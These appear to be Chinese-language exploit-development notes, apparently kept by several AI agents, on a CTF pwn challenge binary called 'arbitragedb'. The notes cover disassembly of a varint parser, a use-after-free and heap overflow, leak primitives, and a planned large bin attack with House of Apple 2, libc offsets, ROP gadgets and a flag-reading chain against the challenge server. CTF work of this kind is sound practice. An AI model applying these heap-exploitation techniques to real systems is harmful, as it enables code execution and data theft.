- 他看到的內容 `[C_byte, payload...]` 對應 `memcpy(rec+0x30, payload, min(copylen,0x20))` ✓
- `{0,1,2,0x40,0x7f}` 全部走 inline 路徑 ✓

→ 模型能同時解釋「他看到的」與「他沒看到的」，可信度高。但**仍需動態驗證**。


---

## 16. `sub_4566` **不是** varint decoder 的 wrapper（byte-level 複驗）

planner 在 `26ea269` 主張「`sub_4566` 只是 `sub_44bb` 的 wrapper，所以 B 也是純 varint，
UAF 閘門仍然是 `B != C`」。**這個主張不成立。**
我直接讀原始 bytes（不靠 objdump 顯示）複驗：

```
45c3: 48 8b 45 d8    mov rax,[rbp-0x28]    ; adv_ptr（第3參數）
45c7: 48 8b 00       mov rax,[rax]         ; *adv = varint 佔用的 byte 數
45ca: 48 83 f8 01    cmp rax,1
45ce: 76 1a          jbe 45ea              ; *adv <= 1 -> 回完整值
45d0: 48 8b 45 e8    mov rax,[rbp-0x18]    ; p
45d4: 0f b6 00       movzx eax,byte [rax]  ; p[0]
45d7: 84 c0          test al,al
45d9: 79 0f          jns 45ea              ; p[0] < 0x80 -> 回完整值
45e5: 83 e0 7f       and eax,0x7f          ; ★ 只取 p[0] 低 7 bits
45e8: eb 04          jmp 45ee              ; 回截斷值
45ea: 48 8b 45 f0    mov rax,[rbp-0x10]    ; 正常路徑：完整 varint 值
```

`0x45e5` 的 `and eax,0x7f` 是決定性證據：**wrapper 不會有這條指令。**

### 語意（已修正條件）

```c
if (*adv > 1 && (p[0] & 0x80))   // 多 byte 編碼
    return p[0] & 0x7f;          // 截斷
return val;                      // 完整值
```

⚠️ 條件是 **`*adv > 1`**（byte 數），不是我第 15 節寫的 `val > 1`。
已在 0–0x3fff 全範圍驗證兩種寫法結論**完全一致**（0 個輸入有差異），
所以第 15 節的結論與參數不受影響，但 `stage1.py` 已改成精確版本。

### 對 planner 推論的回應

planner 說「pc_agent 測不到只是因為 SELECT 語法錯」——
**SELECT 語法確實錯（這點他對）**，但那不足以解釋全部：

即使查詢有效，用單 byte varint（`{0,1,2,0x40,0x7f}`）時 `arg4 == varint#2`，
只要 `varint#2 == varint#3` 就 `arg4 == arg5`，閘門仍然關閉。
**兩個因素是獨立的，都要修正**：
1. 查詢要用 `SELECT * FROM sys_imports;`（有分號、不含 `SELECT 1`）
2. varint#2 要 ≥ 0x80 讓截斷發生，才可能 `arg4 != arg5`

→ 下次動態測試請**同時**套用這兩點，否則仍可能測不到。

---

## 17. 🟢🔴 linux_agent 動態驗證 + 重大模型修正（2026-09-19，Arch Linux 實跑）

**環境**：Arch Linux，`LD_LIBRARY_PATH=. ./arbitragedb formal_state`（系統 ld 2.44 可載入附件 libc 2.43，
malloc/heap 全走附件 libc，offset 正確）。gdb 直接 debug（不要用 exec-wrapper，否則 PIE 不重定位）。
本地 dev 建議 `setarch -R` 關 ASLR：heap=0x55555743c000, libc=0x7ffff7d6b000（固定）。
pwntools 裝在 scratchpad venv。**gen_poc.py / stage1.py 的參數模型全部作廢，見下。**

### 17.1 真正的 IMPORT 參數模型（gdb 逐暫存器實測 sub_4988）
- **A** = 第一個 varint（sub_44bb），前進 off。**0x4c43 的 `<=0x80` 檢查是檢查 A**，A 之後未被使用。
- 接著讀「**同一個 varint V**」兩次（關鍵：sub_4566 **不前進 off**，之後 sub_44bb 才前進 off）：
  - `B = sub_4566(V)`；單 byte 時 = V，多 byte 時 = `firstbyte & 0x7f`。**恆等於 `C & 0x7f`**。
  - `C = 完整 LEB128(V)`，**無上限**。
- 傳進 sub_4604：`alloc = (C&0x7f) + 0x18`（clamp 0x1000），`copylen = min(C, remaining)`，
  `remaining = size - off`（size ≤ 0x4000）。
- **UAF 分支 = (B != C)**，只在 V 多 byte 時成立（單 byte ⇒ B==C）。
- **溢出**：多 byte V 給小 `C&0x7f`（小 alloc）+ 大 C ⇒ memcpy 把 **~0x3fe0 bytes 全可控內容**
  寫進 `malloc((C&0x7f)+0x18)` 小 chunk。長度 = min(C,remaining) 精確可調（步進 0x80，因低 7 bits 綁 alloc）。
  例：`C=0x80` → alloc=0x18(0x20 chunk)，`C=0xc0`→alloc=0x58(0x60 chunk) copylen=0xc0。

正確 import 編碼（見 scratchpad/adblib.py）：`ADB1 + 12*\x00 + lv(A) + lv(C) + payload`，
`IMPORT <name> FORMAT ADB1 SIZE <len>\n<body>`。B 由 binary 自 C 推導，不要自己塞第三個 varint。

### 17.2 已實測成立的原語
- ✅ **Q1 leak（免溢出）**：UAF import（V 多 byte，B≠C，payload 小到不溢出）→ `SELECT * FROM sys_imports;`
  - q=malloc(0x520)→0x530 chunk，free 後：單獨在 unsorted ⇒ fd/bk = main_arena（**libc leak**，
    `libc = leak - 0x212ac8`，低 12 bits 恆 0xac8）；情境使其落 tcache 時 ⇒ mangled fd+key（**heap leak**，
    `heap = mangled << 12`）。一條連線可同時取得。
- 分配序（每個 UAF import）：`raw=malloc(bodylen)` → `p=malloc((C&7f)+0x18)` →〔溢出 memcpy〕→
  `q=malloc(0x520)` → `aux=malloc(0x80)` → `free(q)` → `free(p)`(0x497e) → `free(raw)`(0x4c99)。**aux 不 free（持久）**。
- **關鍵限制**：p/q/raw 每個寫完都會被 free。所以 **tcache poison 直接寫 libc 會 abort**
  （free 一個 libc 位址；且 _IO_list_all 附近 libc 全 0，size 欄=0 → free 檢查失敗）。
  tcache poison 只能拿到「任意 **heap** 寫」（free-safe）。

### 17.3 exploit 路線（free-safe）：large bin attack → _IO_list_all → House of Apple 2
1. leak libc + heap（17.2）。
2. **large bin attack**：把一個大 chunk C1 弄進 largebin（free 大 chunk 後，用一個「更大 size 的 raw
   malloc」掃 unsorted 把它 sort 進 largebin），用**大溢出**改 C1 的 `bk_nextsize = _IO_list_all - 0x20`；
   再 free 一個「同 largebin index 但較小」的 chunk（可用 raw 控 size），插入時
   `C1->bk_nextsize->fd_nextsize = victim` ⇒ `*_IO_list_all = &victim`（heap，**不 free 目標**）。
   → victim 的內容 = 偽 FILE（victim 用 raw buffer，內容 = ADB1 body 可控；注意 free 會蓋掉前 0x20 bytes，
   偽 FILE 關鍵欄位放在 offset ≥0x20：write_base 0x20/write_ptr 0x28/_wide_data 0xa0/vtable 0xd8/_mode 0xc0）。
3. exit → `_IO_flush_all` 走 _IO_list_all → House of Apple 2（vtable=`_IO_wfile_jumps` libc+0x211228）
   → `setcontext+0x3d`(libc+0x4bebd，rdx 版，rsp=[rdx+0xa0] rip=[rdx+0xa8]) → SROP/直接 chain。
4. ORW：`openat(AT_FDCWD=-100,"/home/arbitragedb/flag",0,0)` → read → write(1)。rt_sigreturn 有開，用 SROP 設暫存器。
   目標檔 flag 在遠端 `/home/arbitragedb/flag`；遠端 `nc 0.cloud.chals.io 12983`。

**待驗證（grinding 中）**：large bin attack 在 glibc 2.43 的插入檢查點；偽 FILE 前 0x20 被 free 蓋掉的影響；
setcontext 觸發時 rdx 實際落點。已確認一個 freed 大 chunk 會緊鄰在小溢出-p 上方（可被溢出打到）。

符號 offset（附件 libc 2.43，dynsym 實測）：
`_IO_list_all=0x213480 _IO_2_1_stdout_=0x213580 _IO_wfile_jumps=0x211228 _IO_file_jumps=0x211030`
`setcontext=0x4be80(+0x3d=0x4bebd) environ=0x219de8 main_arena=0x212a68`
gadget（libc）：`pop rdi=0x11bc7a pop rsi=0x5c2e7 pop rax=0xe5dc7 syscall=0xa0be6 ret=0x289fe`；**無 pop rdx**。
